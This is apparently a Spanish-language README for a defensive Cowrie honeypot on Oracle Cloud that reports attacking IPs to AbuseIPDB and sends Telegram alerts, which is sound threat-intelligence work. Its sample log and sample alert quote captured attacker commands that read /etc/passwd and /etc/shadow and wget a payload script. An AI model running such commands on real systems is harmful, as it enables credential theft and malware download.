# Honeypot SSH/Telnet en la Nube con Reporte Automatico a AbuseIPDB

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=flat-square&logo=linux)
![Cloud](https://img.shields.io/badge/Cloud-Oracle%20OCI-red?style=flat-square&logo=oracle)
![Honeypot](https://img.shields.io/badge/Honeypot-Cowrie-yellow?style=flat-square)
![Community](https://img.shields.io/badge/Community-AbuseIPDB-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)

> Sistema de trampa activo en la nube que captura, analiza y reporta automaticamente amenazas reales a la comunidad global de ciberseguridad.

---

## Que hace este proyecto?

Este honeypot simula un servidor SSH/Telnet vulnerable expuesto en Internet para atraer atacantes reales. Cada intento de intrusion es **registrado, analizado y reportado automaticamente** a [AbuseIPDB](https://www.abuseipdb.com/), contribuyendo a una base de datos global de amenazas utilizada por miles de organizaciones en el mundo.

```
Internet
    |
    v
[Atacante]──────────────────────────────────────────────┐
                                                         |
                                              ┌──────────v──────────┐
                                              |   OCI Instance      |
                                              |  ┌───────────────┐  |
                                              |  | Cowrie (SSH)  |  |
                                              |  |  Puerto 22    |  |
                                              |  └──────┬────────┘  |
                                              |         |            |
                                              |  ┌──────v────────┐  |
                                              |  |  Log Parser   |  |
                                              |  |   (Python)    |  |
                                              |  └──────┬────────┘  |
                                              └─────────┼───────────┘
                                                        |
                          ┌─────────────────────────────┼───────────────────┐
                          |                             |                   |
               ┌──────────v──────┐          ┌──────────v──────┐  ┌────────v────────┐
               |   Telegram Bot  |          |   AbuseIPDB API |  |  JSON Log File  |
               |  Alerta en      |          |  Reporte de IP  |  |  Almacenamiento |
               |  tiempo real    |          |  maliciosa      |  |  local          |
               └─────────────────┘          └─────────────────┘  └─────────────────┘
```

---

## Objetivos del Proyecto

- **Recoleccion de Inteligencia:** Capturar TTPs (Tacticas, Tecnicas y Procedimientos) de atacantes reales
- **Contribucion Comunitaria:** Reportar IPs maliciosas a AbuseIPDB para proteger a otros sistemas
- **Alertas en Tiempo Real:** Notificacion instantanea via Telegram de cada intento de intrusion
- **Analisis de Patrones:** Identificar tendencias de ataque, paises de origen y herramientas usadas

---

## Stack Tecnologico

| Componente | Tecnologia | Funcion |
|---|---|---|
| **Honeypot** | Cowrie | Simula servidor SSH/Telnet vulnerable |
| **Infraestructura** | Oracle Cloud (OCI) | Instancia expuesta en Internet |
| **Alertas** | Python + Telegram API | Notificaciones en tiempo real |
| **Reporte** | Python + AbuseIPDB API | Reporte automatico de IPs maliciosas |
| **SO** | Debian/Ubuntu Linux | Sistema base del servidor |
| **Logs** | JSON + Cowrie logs | Almacenamiento de eventos |

---

## Arquitectura de Infraestructura

```
Oracle Cloud Infrastructure (OCI)
┌─────────────────────────────────────┐
|  Virtual Cloud Network (VCN)        |
|  ┌───────────────────────────────┐  |
|  |  Compute Instance (VM)        |  |
|  |  ┌─────────────────────────┐  |  |
|  |  |  Ubuntu Server          |  |  |
|  |  |  ├── Cowrie (SSH :22)   |  |  |
|  |  |  ├── Cowrie (Tel :23)   |  |  |
|  |  |  └── Python Scripts     |  |  |
|  |  └─────────────────────────┘  |  |
|  |  Security List:               |  |
|  |  ├── Ingress: 22, 23 (0.0.0.0)|  |
|  |  └── Egress: All              |  |
|  └───────────────────────────────┘  |
└─────────────────────────────────────┘
```

---

## Instalacion y Configuracion

### Prerrequisitos
- Cuenta en Oracle Cloud (Free Tier disponible)
- Python 3.8+
- Token de Bot de Telegram
- API Key de AbuseIPDB

### 1. Clonar el repositorio
```bash
git clone https://github.com/luis-angel-sc/honeypot-cowrie-oci.git
cd honeypot-cowrie-oci
```

### 2. Instalar dependencias
```bash
# Instala todas las librerias necesarias definidas en requirements.txt
# Incluye: requests, python-dotenv, watchdog
pip install -r requirements.txt
```

### 3. Instalar y configurar Cowrie
```bash
# Instalar dependencias del sistema necesarias para compilar Cowrie
sudo apt-get install git python3-virtualenv libssl-dev libffi-dev build-essential python3-dev

# Crear un usuario dedicado para Cowrie
# Buena practica: nunca correr el honeypot como root
sudo adduser --disabled-password cowrie

# Clonar el repositorio oficial de Cowrie en el home del usuario
sudo -u cowrie git clone https://github.com/cowrie/cowrie /home/cowrie/cowrie
cd /home/cowrie/cowrie

# Crear un entorno virtual aislado para las dependencias de Cowrie
# Esto evita conflictos con otras versiones de Python en el sistema
sudo -u cowrie virtualenv cowrie-env

# Instalar las dependencias de Python dentro del entorno virtual
sudo -u cowrie cowrie-env/bin/pip install -r requirements.txt
```

### 4. Configurar variables de entorno
```bash
# Copiar el archivo de ejemplo como punto de partida
cp .env.example .env
```
Edita `.env` con tus credenciales:
```env
# Token del bot de Telegram - se obtiene hablando con @BotFather en Telegram
TELEGRAM_BOT_TOKEN=tu_token_aqui

# ID del chat donde el bot enviara las alertas
# Puedes obtenerlo hablando con @userinfobot en Telegram
TELEGRAM_CHAT_ID=tu_chat_id_aqui

# API Key de AbuseIPDB - se genera gratis en abuseipdb.com/register
ABUSEIPDB_API_KEY=tu_api_key_aqui

# Ruta al archivo de logs JSON generado por Cowrie
# Este es el path por defecto de instalacion
COWRIE_LOG_PATH=/home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

### 5. Ejecutar el monitor
```bash
# Inicia el script principal que monitorea los logs en tiempo real
# Recomendado: correr dentro de un screen o tmux para que persista en segundo plano
python3 src/monitor.py
```

---

## Estructura del Proyecto

```
honeypot-cowrie-oci/
│
├── README.md                   # Documentacion principal del proyecto
├── requirements.txt            # Dependencias de Python (requests, dotenv, watchdog)
├── .env.example                # Plantilla de variables de entorno (sin datos reales)
│
├── src/
│   ├── monitor.py              # Script principal: vigila el archivo de logs en tiempo real
│   ├── telegram_alert.py       # Modulo que construye y envia alertas via Telegram Bot API
│   ├── abuseipdb_report.py     # Modulo que reporta IPs maliciosas a la API de AbuseIPDB
│   └── log_parser.py           # Parser que lee y estructura los logs JSON de Cowrie
│
├── docs/
│   ├── setup_oci.md            # Guia paso a paso: crear instancia en Oracle Cloud
│   ├── setup_cowrie.md         # Guia de instalacion y configuracion de Cowrie
│   └── architecture.md         # Diagrama detallado de la arquitectura del sistema
│
└── data/
    └── sample_logs/            # Logs de ejemplo con IPs anonimizadas para referencia
```

---

## Datos Recolectados (Muestra)

Ejemplo de eventos capturados en las primeras 24 horas de operacion:

```json
{
  "timestamp": "2026-05-10T03:42:17",
  "src_ip": "XX.XX.XX.XX",
  "country": "CN",
  "username": "root",
  "password": "admin123",
  "commands_executed": ["cat /etc/passwd", "wget http://[redacted]"],
  "session_duration": "00:02:34"
}
```

### Estadisticas de ejemplo
| Metrica | Valor |
|---|---|
| IPs unicas detectadas | +120 en 7 dias |
| Pais de origen #1 | China |
| Pais de origen #2 | Rusia |
| Contrasena mas usada | `admin`, `123456`, `root` |
| Comando mas ejecutado | `cat /etc/passwd` |
| IPs reportadas a AbuseIPDB | +80 en 7 dias |

---

## Contribucion a la Comunidad

Este proyecto reporta automaticamente IPs maliciosas a **[AbuseIPDB](https://www.abuseipdb.com/)**, una base de datos colaborativa utilizada por:

- Empresas de seguridad
- Proveedores de hosting
- Firewalls y sistemas IDS/IPS en todo el mundo

Cada IP reportada incluye:
- Categoria de ataque (SSH Brute Force)
- Timestamp del evento
- Descripcion del comportamiento observado

> Si quieres hacer tu propio reporte, puedes obtener una API Key gratuita en [abuseipdb.com](https://www.abuseipdb.com/register)

---

## Ejemplo de Alerta en Telegram

```
[ALERTA] INTENTO DE INTRUSION DETECTADO

IP: XX.XX.XX.XX
Pais: Russia (RU)
Usuario: root
Contrasena: toor123
Comandos ejecutados:
   -- uname -a
   -- cat /etc/shadow
   -- wget http://[redacted]/payload.sh

Duracion sesion: 1m 47s
Reportado a AbuseIPDB: SI
```

---

## Lo que aprendi

- Despliegue y administracion de instancias en **Oracle Cloud Infrastructure**
- Configuracion y operacion de **honeypots SSH/Telnet con Cowrie**
- Integracion de **APIs externas** (Telegram, AbuseIPDB) con Python
- Analisis de **logs en tiempo real** y deteccion de patrones de ataque
- Conceptos practicos de **Threat Intelligence** y contribucion comunitaria
- Hardening basico de servidores Linux expuestos en Internet

---

## ⚠️ Disclaimer

> Este proyecto esta disenado **unicamente con fines educativos y de investigacion en ciberseguridad**. El honeypot opera en una instancia aislada en la nube, sin conexion a sistemas de produccion ni datos sensibles. Todos los datos de IPs publicados en este repositorio estan **anonimizados**. El autor no se hace responsable del uso indebido de las tecnicas aqui documentadas.

---

## Contacto

**Luis SC**
- [LinkedIn](https://linkedin.com/in/luis-angel-sc)
- [GitHub](https://github.com/luis-angel-sc)

---

Si este proyecto te fue util o aprendiste algo, considera darle una estrella al repositorio. Ayuda a que mas personas lo encuentren.
